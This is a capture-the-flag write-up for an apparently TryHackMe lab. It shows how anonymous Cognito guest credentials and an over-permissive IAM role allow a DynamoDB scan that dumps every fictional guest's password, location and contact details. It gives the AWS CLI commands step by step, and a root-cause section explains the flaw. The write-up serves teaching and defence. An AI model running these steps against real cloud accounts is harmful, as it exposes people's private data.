---

Name: Complimentary
Difficutly: Easy
URL: https://tryhackme.com/room/hh-complimentary-05e0b604
Description: Install the free app and it hands your phone a set of cloud keys, the same set it hands everyone. They're read-only, but read-only of every guest's contacts, location, and passwords, not just Lambo's. She gave consent. Technically.

---

# Description
The application allows users to access a personal dashboard without requiring authentication. Instead of logging in, every visitor is treated as a guest and is issued temporary AWS credentials through an Amazon Cognito Identity Pool.

The intended behavior is that each guest can only view their own wellness profile. However, the permissions assigned to the guest role are overly permissive, allowing any guest to read every profile stored in the DynamoDB table.

# Source Code Analysis
Viewing the page source reveals the application's JavaScript (app.js), which contains the Cognito Identity Pool ID and the DynamoDB table name
```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

The application does not authenticate users. Instead, it requests temporary AWS credentials for anonymous visitors using the Identity Pool:
```javascript
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});
```

After obtaining these credentials, the application performs a GetItem request against DynamoDB using a randomly generated guest ID stored in the browser's local storage

At first glance this appears secure because the application only requests the current guest's record. However, authorization is enforced by AWS IAM, not by the JavaScript running in the browser. If the IAM policy grants additional permissions, we are free to use them ourselves

# Obtaining Guest Credentials
First, request a Cognito Identity ID:
```bash
$ aws cognito-identity get-id \
    --region us-east-1 \
    --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
{
    "IdentityId": "us-east-1:4d571309-b0ee-c5e5-0a40-b4223ef560f9"
}
```

Next, exchange the Identity ID for temporary AWS credentials:
```bash
$ aws cognito-identity get-credentials-for-identity \
    --region us-east-1 \
    --identity-id us-east-1:4d571309-b055-c361-a9f4-2d25f0994477
{
    "IdentityId": "us-east-1:4d571309-b055-c361-a9f4-2d25f0994477",
    "Credentials": {
        "AccessKeyId": "<REDACTED>",
        "SecretKey": "<REDACTED>",
        "SessionToken": "<REDACTED>",
        "Expiration": "2026-07-30T11:59:53+03:00"
    }
}

```

These credentials can then be exported so the AWS CLI authenticates as the anonymous guest user
```bash
export AWS_ACCESS_KEY_ID="<REDACTED>"

export AWS_SECRET_ACCESS_KEY="<REDACTED>"

export AWS_SESSION_TOKEN='<REDACTED>'

export AWS_DEFAULT_REGION="us-east-1"
```

To verify that the credentials are valid:
```bash
$ aws sts get-caller-identity
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}

```
This confirms that we have assumed the anonymous Cognito guest role

# Exploitation
The web application only performs a GetItem request for the current guest's record, but the temporary credentials can be used directly with the AWS CLI

Attempting a full table scan:
```bash
$ aws dynamodb scan \
    --table-name complimentary-GuestWellnessProfiles

{
    "Items": [
        {
            "password": {
                "S": "digitaldetox2026"
            },
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
            },
            "guest_id": {
                "S": "guest-vibe"
            },
            "email": {
                "S": "vibe@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0193"
            },
            "name": {
                "S": "Vibe (Move Fast & Break Things)"
            }
        },
        {
            "password": {
                "S": "sunkissed88"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."
            },
            "guest_id": {
                "S": "guest-lambo"
            },
            "email": {
                "S": "lambo@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0142"
            },
            "name": {
                "S": "Lambo (@0xMia)"
            }
        },
        {
            "password": {
                "S": "escalation_only"
            },
            "location": {
                "S": "25.2048,55.2708"
            },
            "notes": {
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its ow
n. THM{REDACTED}"
            },
            "guest_id": {
                "S": "guest-vip-042"
            },

            "email": {
                "S": "vip042@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0100"
            },
            "name": {
                "S": "Guest VIP-042"
            }
        },
        {
            "password": {
                "S": "haveyoutriedrestarting"
            },
            "location": {
                "S": "25.2030,55.2690"
            },
            "notes": {
                "S": "Filed three tickets about this app. All closed as \"resolved\" by VERA."
            },
            "guest_id": {
                "S": "guest-patch"
            },
            "email": {
                "S": "patch@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0159"
            },
            "name": {
                "S": "Patch (Have You Tried Turning It Off)"
            }
        },
        {
            "password": {
                "S": "notmykeys1"
            },
            "location": {
                "S": "25.2011,55.2701"
            },
            "notes": {
                "S": "Checks his portfolio 34 times a day. Brought three devices for \"redundancy.\""
            },
            "guest_id": {
                "S": "guest-ponzi"
            },
            "email": {
                "S": "ponzi@hackerholidays.thm"
            },
            "phone": {
                "S": "+1-555-0187"
            },
            "name": {
                "S": "Ponzi (Satoshi_Probably)"
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5,
    "ConsumedCapacity": null
}
```
returns every record stored in the table, including names, email addresses, phone numbers, passwords, locations, and internal notes. Among the returned records is the flag

# Root Cause
The application intentionally exposes temporary AWS credentials through an unauthenticated Cognito Identity Pool. This is a common AWS pattern and is not inherently insecure.

The vulnerability is that the IAM role associated with anonymous users grants overly broad permissions on the DynamoDB table. Instead of restricting guests to reading only their own record, the role also allows operations such as Scan, enabling any anonymous user to retrieve every item in the database.

The developers relied on the client-side JavaScript to limit access by only issuing GetItem requests. However, once an attacker obtains valid AWS credentials, they can make any API call permitted by the attached IAM policy. Since the guest role was allowed to scan the table, the entire database became accessible.
